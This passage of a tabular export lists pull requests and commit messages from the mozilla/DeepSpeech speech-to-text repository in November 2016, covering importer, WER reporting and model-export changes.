Set batch_size to 32, fixes #150",lissyx,1645737,2016-11-09T12:06:19Z,COLLABORATOR,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1907f9eead1558278c75a9353932a0ff4f8d3894,"Change automation parameters

Set importer to 'ted' instead of 'ted_lium', fixes #149
Set batch_size to 32, fixes #150"
4394,https://api.github.com/repos/mozilla/DeepSpeech/pulls/147,147,Remove an unnecessary transpose,"This cuts out an unnecessary transpose, which I suppose over a very long run may have some significant saving. If we could refactor our importers to import in this format, we could remove one more, but I suspect that the change required to do that would actually be more intensive than leaving it as it is and just having one transpose that can run on the GPU.",Cwiiis,668518,2016-11-09T09:25:08Z,CONTRIBUTOR,True,5,12,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,41fa09a1ad555df4c7860137d55d9eba4328c4a0,Remove an unnecessary transpose
4395,https://api.github.com/repos/mozilla/DeepSpeech/pulls/146,146,Fix #144; Ability to limit amount of samples in TEDLIUM,@andrenatal Is this OK for testing purposes?,tilmankamp,5991088,2016-11-08T15:32:06Z,CONTRIBUTOR,True,7,5,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b1fc959f7a19ae297cdc518736e04a18962616ff,Fix #144; Ability to limit amount of samples in TEDLIUM
4396,https://api.github.com/repos/mozilla/DeepSpeech/pulls/145,145,Adding sox README.md,@Cwiiis take a look please?,andrenatal,973388,2016-11-08T15:23:43Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2c6674a6f4e7d75d92b2964274b06fb48153cbda,Update README.md
4397,https://api.github.com/repos/mozilla/DeepSpeech/pulls/143,143,"Add a README.md file, fixes #88",,Cwiiis,668518,2016-11-08T13:37:35Z,CONTRIBUTOR,True,27,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6bb8654f50ae9030c43b1b402796c398d5ec52d6,Add a README.md file
4398,https://api.github.com/repos/mozilla/DeepSpeech/pulls/142,142,Verify date of merges when pulling list of changes,Fixes #141,lissyx,1645737,2016-11-08T13:14:49Z,COLLABORATOR,True,30,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fa0fc1443925fe60f71dd436e55e685b0077bf99,"Verify date of merges when pulling list of changes

Fixes #141"
4399,https://api.github.com/repos/mozilla/DeepSpeech/pulls/140,140,Wer update,,lissyx,1645737,2016-11-08T12:42:39Z,COLLABORATOR,True,146,4,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3bac760fa0187fef36ea0232b4ce7ddea585fe97,Don't reuse the session to export
4400,https://api.github.com/repos/mozilla/DeepSpeech/pulls/140,140,Wer update,,lissyx,1645737,2016-11-08T12:42:39Z,COLLABORATOR,True,146,4,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f4766cce92131b01604609de338103cc24d67c76,"Merge pull request #136 from Cwiiis/new-session-for-export

Don't reuse the session to export, fixes #135"
4401,https://api.github.com/repos/mozilla/DeepSpeech/pulls/140,140,Wer update,,lissyx,1645737,2016-11-08T12:42:39Z,COLLABORATOR,True,146,4,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6178c31a203af08101494d5affde822959aa612a,Write a Tensorflow Serving client
4402,https://api.github.com/repos/mozilla/DeepSpeech/pulls/140,140,Wer update,,lissyx,1645737,2016-11-08T12:42:39Z,COLLABORATOR,True,146,4,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6449fc45bdfd2da369fd9757a0511452cb3859eb,"Merge pull request #127 from Cwiiis/serving-client

Write a Tensorflow Serving client, fixes #21"
4403,https://api.github.com/repos/mozilla/DeepSpeech/pulls/140,140,Wer update,,lissyx,1645737,2016-11-08T12:42:39Z,COLLABORATOR,True,146,4,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,25dbf39622d38928ffa75c8fc71b1edb123f410d,Merge remote-tracking branch 'upstream/master' into wer-update
4404,https://api.github.com/repos/mozilla/DeepSpeech/pulls/139,139,Switch importers to the new input pipeline,"I haven't finished testing with datasets other than LDC93S1 yet, and I still need to figure out a proper fix for the race between importer and training, but since this work is blocking the work week I'm publishing it anyway. Maybe it's best to merge it with the hack to unblock others and then fix it.",reuben,477142,2016-11-08T04:48:33Z,MEMBER,True,195,149,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ca98c5aab85e485f304f44403a76bcb7bf25e1b6,Expose text_to_char_array in util/text.py
4405,https://api.github.com/repos/mozilla/DeepSpeech/pulls/139,139,Switch importers to the new input pipeline,"I haven't finished testing with datasets other than LDC93S1 yet, and I still need to figure out a proper fix for the race between importer and training, but since this work is blocking the work week I'm publishing it anyway. Maybe it's best to merge it with the hack to unblock others and then fix it.",reuben,477142,2016-11-08T04:48:33Z,MEMBER,True,195,149,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,182e20187a8c94f6e445c941e3d7bbffa88c997b,Switch importers to new input pipeline
4406,https://api.github.com/repos/mozilla/DeepSpeech/pulls/139,139,Switch importers to the new input pipeline,"I haven't finished testing with datasets other than LDC93S1 yet, and I still need to figure out a proper fix for the race between importer and training, but since this work is blocking the work week I'm publishing it anyway. Maybe it's best to merge it with the hack to unblock others and then fix it.",reuben,477142,2016-11-08T04:48:33Z,MEMBER,True,195,149,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c0bb34cfd337054bcd40bf0caaa762886777a9a3,Undo extraction of shared DataSets code from importers
4407,https://api.github.com/repos/mozilla/DeepSpeech/pulls/139,139,Switch importers to the new input pipeline,"I haven't finished testing with datasets other than LDC93S1 yet, and I still need to figure out a proper fix for the race between importer and training, but since this work is blocking the work week I'm publishing it anyway. Maybe it's best to merge it with the hack to unblock others and then fix it.",reuben,477142,2016-11-08T04:48:33Z,MEMBER,True,195,149,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dba8f219f73e03ce17ec5526c7a77c9d4547290a,Only start the importers' queue threads after we initialize variables
4408,https://api.github.com/repos/mozilla/DeepSpeech/pulls/139,139,Switch importers to the new input pipeline,"I haven't finished testing with datasets other than LDC93S1 yet, and I still need to figure out a proper fix for the race between importer and training, but since this work is blocking the work week I'm publishing it anyway. Maybe it's best to merge it with the hack to unblock others and then fix it.",reuben,477142,2016-11-08T04:48:33Z,MEMBER,True,195,149,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d989e8de09fa80520ec4c0b1e901d3fd0b792c8a,"Make sure the initializer passed to tf.scan doesn't break the API contract

We need to make sure the initializer shape matches the return value
of the callable passed to tf.scan.

This also adds an assertion on the shape of labels and the values
in label_lengths that enforces a condition that is needed for
ctc_label_dense_to_sparse to work."
4409,https://api.github.com/repos/mozilla/DeepSpeech/pulls/139,139,Switch importers to the new input pipeline,"I haven't finished testing with datasets other than LDC93S1 yet, and I still need to figure out a proper fix for the race between importer and training, but since this work is blocking the work week I'm publishing it anyway. Maybe it's best to merge it with the hack to unblock others and then fix it.",reuben,477142,2016-11-08T04:48:33Z,MEMBER,True,195,149,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6fb628521de47491121ebd631c880307bbe8afe3,Normalize non-ASCII chars in the importers
4410,https://api.github.com/repos/mozilla/DeepSpeech/pulls/137,137,Wer update,,lissyx,1645737,2016-11-07T17:39:52Z,COLLABORATOR,True,110,50,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b6a10a60dca8c054b4e05c89ec0ba094b0697309,Don't export model by default
4411,https://api.github.com/repos/mozilla/DeepSpeech/pulls/137,137,Wer update,,lissyx,1645737,2016-11-07T17:39:52Z,COLLABORATOR,True,110,50,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4add35b81bdcfe4c5215d78d71b6dbaabec70038,"Merge pull request #125 from Cwiiis/dont-export-by-default

Don't export model by default, fixes #124"
4412,https://api.github.com/repos/mozilla/DeepSpeech/pulls/137,137,Wer update,,lissyx,1645737,2016-11-07T17:39:52Z,COLLABORATOR,True,110,50,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,23635420fe928814804ffd3d7fa9da10ce3a2040,Expose FULL_TRACE logging capability
4413,https://api.github.com/repos/mozilla/DeepSpeech/pulls/137,137,Wer update,,lissyx,1645737,2016-11-07T17:39:52Z,COLLABORATOR,True,110,50,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,529766a0807c2599c589b99f7e203ae2899a9eb1,"Merge pull request #118 from lissyx/gpu-memory

Expose FULL_TRACE logging capability"
4414,https://api.github.com/repos/mozilla/DeepSpeech/pulls/137,137,Wer update,,lissyx,1645737,2016-11-07T17:39:52Z,COLLABORATOR,True,110,50,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,34848dcda7de78e879d62d6c12ff38c80cee87cf,"Switch dependency from xdg to pyxdg

Fixes #129"
4415,https://api.github.com/repos/mozilla/DeepSpeech/pulls/137,137,Wer update,,lissyx,1645737,2016-11-07T17:39:52Z,COLLABORATOR,True,110,50,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5f58d57e62e9493ac78225ebddc1e86bb5b813d3,"Merge pull request #130 from lissyx/xdg

Switch dependency from xdg to pyxdg"
4416,https://api.github.com/repos/mozilla/DeepSpeech/pulls/137,137,Wer update,,lissyx,1645737,2016-11-07T17:39:52Z,COLLABORATOR,True,110,50,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7dc951d6b2f75f06ceb68dd8057e417e409e737b,Merge remote-tracking branch 'upstream/master' into wer-update
4417,https://api.github.com/repos/mozilla/DeepSpeech/pulls/136,136,"Don't reuse the session to export, fixes #135",,Cwiiis,668518,2016-11-07T17:28:20Z,CONTRIBUTOR,True,8,4,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3bac760fa0187fef36ea0232b4ce7ddea585fe97,Don't reuse the session to export
4418,https://api.github.com/repos/mozilla/DeepSpeech/pulls/130,130,Switch dependency from xdg to pyxdg,Fixes #129,lissyx,1645737,2016-11-07T14:28:24Z,COLLABORATOR,True,4,4,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,34848dcda7de78e879d62d6c12ff38c80cee87cf,"Switch dependency from xdg to pyxdg

Fixes #129"
4419,https://api.github.com/repos/mozilla/DeepSpeech/pulls/127,127,"Write a Tensorflow Serving client, fixes #21",,Cwiiis,668518,2016-11-07T11:09:26Z,CONTRIBUTOR,True,138,0,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6178c31a203af08101494d5affde822959aa612a,Write a Tensorflow Serving client
4420,https://api.github.com/repos/mozilla/DeepSpeech/pulls/125,125,"Don't export model by default, fixes #124",,Cwiiis,668518,2016-11-07T09:29:16Z,CONTRIBUTOR,True,46,44,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b6a10a60dca8c054b4e05c89ec0ba094b0697309,Don't export model by default
4421,https://api.github.com/repos/mozilla/DeepSpeech/pulls/123,123,Wer update,,lissyx,1645737,2016-11-07T09:14:36Z,COLLABORATOR,True,139,59,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,25e218f3ee2c348e52ef1e19e4f7e84b651aff9d,Fix #113; Showing real WER values; corrected wrong WER usage for parameter based charts
4422,https://api.github.com/repos/mozilla/DeepSpeech/pulls/123,123,Wer update,,lissyx,1645737,2016-11-07T09:14:36Z,COLLABORATOR,True,139,59,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cf314408b64777f03afe86e24be959ef5f777755,"Merge pull request #117 from mozilla/issue113

Fix #113; Showing real WER values"
4423,https://api.github.com/repos/mozilla/DeepSpeech/pulls/123,123,Wer update,,lissyx,1645737,2016-11-07T09:14:36Z,COLLABORATOR,True,139,59,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2aba5d78cf695612ad7bf6f8875b3d91cf3319c9,Fix #115; Time based charts now with timeline on the bottom
4424,https://api.github.com/repos/mozilla/DeepSpeech/pulls/123,123,Wer update,,lissyx,1645737,2016-11-07T09:14:36Z,COLLABORATOR,True,139,59,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,340d31ae9c80fbeedc5a810452267f139b014d1f,"Merge pull request #116 from mozilla/issue115

Fix #115; Time based charts now with timeline on the bottom"
4425,https://api.github.com/repos/mozilla/DeepSpeech/pulls/123,123,Wer update,,lissyx,1645737,2016-11-07T09:14:36Z,COLLABORATOR,True,139,59,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1ad35baf4a050a441cb5ea2bf701fa8faad82b77,Base ds_dataset_path on ds_importer by default
4426,https://api.github.com/repos/mozilla/DeepSpeech/pulls/123,123,Wer update,,lissyx,1645737,2016-11-07T09:14:36Z,COLLABORATOR,True,139,59,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ce1080e898bfd022eb4b3f41052317bac402a084,Use XDG_DATA_HOME for checkpoint files
4427,https://api.github.com/repos/mozilla/DeepSpeech/pulls/123,123,Wer update,,lissyx,1645737,2016-11-07T09:14:36Z,COLLABORATOR,True,139,59,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,45d8d6b2718f7b4053a080b7d8c7b9aa7f5e79e5,Derive n_steps from batch_x.shape
4428,https://api.github.com/repos/mozilla/DeepSpeech/pulls/123,123,Wer update,,lissyx,1645737,2016-11-07T09:14:36Z,COLLABORATOR,True,139,59,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,21c1d1fe1fff40db145a500c923c24ff3ee5e1a9,Use reshape/unpack to remove dependency on n_steps in BiRNN()
4429,https://api.github.com/repos/mozilla/DeepSpeech/pulls/123,123,Wer update,,lissyx,1645737,2016-11-07T09:14:36Z,COLLABORATOR,True,139,59,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c0697b94459a3aa7b376f36f03243d8718bca901,Export model after training
4430,https://api.github.com/repos/mozilla/DeepSpeech/pulls/123,123,Wer update,,lissyx,1645737,2016-11-07T09:14:36Z,COLLABORATOR,True,139,59,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cba81fb5e42ca1963a45e177a0cfe64ffed4e3c4,"Merge pull request #112 from Cwiiis/model-extraction-checkpoint

Implement model exporting"
4431,https://api.github.com/repos/mozilla/DeepSpeech/pulls/123,123,Wer update,,lissyx,1645737,2016-11-07T09:14:36Z,COLLABORATOR,True,139,59,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,083474f90a234d58bee31e2814a23b9877a8f779,Merge remote-tracking branch 'upstream/master' into wer-update
4432,https://api.github.com/repos/mozilla/DeepSpeech/pulls/122,122,Wer update,,lissyx,1645737,2016-11-07T09:13:00Z,COLLABORATOR,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9ec213b69c62f6f398bb8cad11df9f1a5e0a2a96,"Merge pull request #95 from lissyx/wer-update

Wer update"
4433,https://api.github.com/repos/mozilla/DeepSpeech/pulls/122,122,Wer update,,lissyx,1645737,2016-11-07T09:13:00Z,COLLABORATOR,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,15d621b9c7a634612bcd21ed4c3096f633f82bf1,"Merge pull request #98 from lissyx/wer-update

Wer update"
4434,https://api.github.com/repos/mozilla/DeepSpeech/pulls/122,122,Wer update,,lissyx,1645737,2016-11-07T09:13:00Z,COLLABORATOR,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,092e5cd6a2aeb6f468dcf23efeed8986601c1ff3,"Merge pull request #103 from lissyx/wer-update

Wer update"
4435,https://api.github.com/repos/mozilla/DeepSpeech/pulls/122,122,Wer update,,lissyx,1645737,2016-11-07T09:13:00Z,COLLABORATOR,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a851136acf23c4a9fe294ba5232c6da8924770ff,Merge remote-tracking branch 'upstream/master' into wer-update
4436,https://api.github.com/repos/mozilla/DeepSpeech/pulls/122,122,Wer update,,lissyx,1645737,2016-11-07T09:13:00Z,COLLABORATOR,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,89ee4f6557cd4f621e9ee517cc3719c9046143a0,"Merge pull request #119 from lissyx/wer-update

Wer update"
4437,https://api.github.com/repos/mozilla/DeepSpeech/pulls/122,122,Wer update,,lissyx,1645737,2016-11-07T09:13:00Z,COLLABORATOR,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,083474f90a234d58bee31e2814a23b9877a8f779,Merge remote-tracking branch 'upstream/master' into wer-update
4438,https://api.github.com/repos/mozilla/DeepSpeech/pulls/121,121,Switchboard importer,"Using this module a swb based model was trained in 6 hours using a gtx1070 on my MTV box.

Here are the params and results:
https://gist.github.com/andrenatal/569719e50821753c953c7c0ade6b234d

@kdavis-mozilla please review it. ",andrenatal,973388,2016-11-06T23:53:32Z,CONTRIBUTOR,True,383,9,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,32a436309e0cf7c030e98ecba386566c575dfd2e,Switchboard importer
4439,https://api.github.com/repos/mozilla/DeepSpeech/pulls/121,121,Switchboard importer,"Using this module a swb based model was trained in 6 hours using a gtx1070 on my MTV box.

Here are the params and results:
https://gist.github.com/andrenatal/569719e50821753c953c7c0ade6b234d

@kdavis-mozilla please review it. ",andrenatal,973388,2016-11-06T23:53:32Z,CONTRIBUTOR,True,383,9,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,501783501dd7d85e7244e745611fe5f0b377ae68,Switchboard importer
4440,https://api.github.com/repos/mozilla/DeepSpeech/pulls/121,121,Switchboard importer,"Using this module a swb based model was trained in 6 hours using a gtx1070 on my MTV box.

Here are the params and results:
https://gist.github.com/andrenatal/569719e50821753c953c7c0ade6b234d

@kdavis-mozilla please review it. ",andrenatal,973388,2016-11-06T23:53:32Z,CONTRIBUTOR,True,383,9,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c92f98669024c7205eb631ba3b70c055f862dfad,Switchboard importer
4441,https://api.github.com/repos/mozilla/DeepSpeech/pulls/121,121,Switchboard importer,"Using this module a swb based model was trained in 6 hours using a gtx1070 on my MTV box.

Here are the params and results:
https://gist.github.com/andrenatal/569719e50821753c953c7c0ade6b234d

@kdavis-mozilla please review it. ",andrenatal,973388,2016-11-06T23:53:32Z,CONTRIBUTOR,True,383,9,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3cbb29ee319061401c44d8ea9141db8ea65298df,deleted swb
4442,https://api.github.com/repos/mozilla/DeepSpeech/pulls/121,121,Switchboard importer,"Using this module a swb based model was trained in 6 hours using a gtx1070 on my MTV box.

Here are the params and results:
https://gist.github.com/andrenatal/569719e50821753c953c7c0ade6b234d

@kdavis-mozilla please review it. ",andrenatal,973388,2016-11-06T23:53:32Z,CONTRIBUTOR,True,383,9,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3e7d3a725aecb2d0fe9e7d0e26cddc094cebeb9b,Fixing reviewer comments
4443,https://api.github.com/repos/mozilla/DeepSpeech/pulls/121,121,Switchboard importer,"Using this module a swb based model was trained in 6 hours using a gtx1070 on my MTV box.

Here are the params and results:
https://gist.github.com/andrenatal/569719e50821753c953c7c0ade6b234d

@kdavis-mozilla please review it. ",andrenatal,973388,2016-11-06T23:53:32Z,CONTRIBUTOR,True,383,9,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d8ff6fcc64db4e94132c14166a2b62ec9901c6f9,Adding script to run swb
4444,https://api.github.com/repos/mozilla/DeepSpeech/pulls/119,119,Wer update,,lissyx,1645737,2016-11-04T09:22:16Z,COLLABORATOR,True,148,43,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a7d009fef84ffb1a01e3d70896dc1e8564c545cd,Fix #15; logging top ten lowest loss samples
4445,https://api.github.com/repos/mozilla/DeepSpeech/pulls/119,119,Wer update,,lissyx,1645737,2016-11-04T09:22:16Z,COLLABORATOR,True,148,43,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0849efd6daff49389437195acc91ca9de60f04e6,Fix #111; documented and revisited WER calculation
4446,https://api.github.com/repos/mozilla/DeepSpeech/pulls/119,119,Wer update,,lissyx,1645737,2016-11-04T09:22:16Z,COLLABORATOR,True,148,43,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bcd99b790a9644ad099b360806969f374bae5203,Fix #110; Fixed average accuracy calculation
4447,https://api.github.com/repos/mozilla/DeepSpeech/pulls/119,119,Wer update,,lissyx,1645737,2016-11-04T09:22:16Z,COLLABORATOR,True,148,43,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b82d477d23088a4f69b4a2d4c150d8ce6d766bed,Changed language version back to 2.7.11
4448,https://api.github.com/repos/mozilla/DeepSpeech/pulls/119,119,Wer update,,lissyx,1645737,2016-11-04T09:22:16Z,COLLABORATOR,True,148,43,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8904aa85e9f98bef4e54320f8ff01f5522a07a14,Better documentation for get_tower_results
4449,https://api.github.com/repos/mozilla/DeepSpeech/pulls/119,119,Wer update,,lissyx,1645737,2016-11-04T09:22:16Z,COLLABORATOR,True,148,43,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,56c10b1d1ee151fa77faeba9caa8d7313330e09f,Fix #114; better WER reporting
4450,https://api.github.com/repos/mozilla/DeepSpeech/pulls/119,119,Wer update,,lissyx,1645737,2016-11-04T09:22:16Z,COLLABORATOR,True,148,43,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,02ee478892d8ce5852f97fbd9b31977f5684cec9,Fixes for PR
4451,https://api.github.com/repos/mozilla/DeepSpeech/pulls/119,119,Wer update,,lissyx,1645737,2016-11-04T09:22:16Z,COLLABORATOR,True,148,43,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,385529dd482f9e5fa6d224d2279afdd2be9b9c22,"Merge pull request #104 from mozilla/issue15

Fix #15; logging top ten lowest loss samples"
4452,https://api.github.com/repos/mozilla/DeepSpeech/pulls/119,119,Wer update,,lissyx,1645737,2016-11-04T09:22:16Z,COLLABORATOR,True,148,43,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a851136acf23c4a9fe294ba5232c6da8924770ff,Merge remote-tracking branch 'upstream/master' into wer-update
4453,https://api.github.com/repos/mozilla/DeepSpeech/pulls/118,118,Expose FULL_TRACE logging capability,,lissyx,1645737,2016-11-03T16:35:58Z,COLLABORATOR,True,60,2,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,23635420fe928814804ffd3d7fa9da10ce3a2040,Expose FULL_TRACE logging capability
4454,https://api.github.com/repos/mozilla/DeepSpeech/pulls/117,117,Fix #113; Showing real WER values,"Also corrected wrong WER usage for parameter based charts.
@lissyx : Please review.",tilmankamp,5991088,2016-11-03T12:07:23Z,CONTRIBUTOR,True,4,11,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,25e218f3ee2c348e52ef1e19e4f7e84b651aff9d,Fix #113; Showing real WER values; corrected wrong WER usage for parameter based charts
4455,https://api.github.com/repos/mozilla/DeepSpeech/pulls/116,116,Fix #115; Time based charts now with timeline on the bottom,@lissyx : Please review.,tilmankamp,5991088,2016-11-03T11:53:27Z,CONTRIBUTOR,True,19,6,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2aba5d78cf695612ad7bf6f8875b3d91cf3319c9,Fix #115; Time based charts now with timeline on the bottom
4456,https://api.github.com/repos/mozilla/DeepSpeech/pulls/112,112,Implement model exporting,,Cwiiis,668518,2016-11-01T17:27:11Z,CONTRIBUTOR,True,116,42,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1ad35baf4a050a441cb5ea2bf701fa8faad82b77,Base ds_dataset_path on ds_importer by default
4457,https://api.github.com/repos/mozilla/DeepSpeech/pulls/112,112,Implement model exporting,,Cwiiis,668518,2016-11-01T17:27:11Z,CONTRIBUTOR,True,116,42,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ce1080e898bfd022eb4b3f41052317bac402a084,Use XDG_DATA_HOME for checkpoint files
4458,https://api.github.com/repos/mozilla/DeepSpeech/pulls/112,112,Implement model exporting,,Cwiiis,668518,2016-11-01T17:27:11Z,CONTRIBUTOR,True,116,42,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,45d8d6b2718f7b4053a080b7d8c7b9aa7f5e79e5,Derive n_steps from batch_x.shape
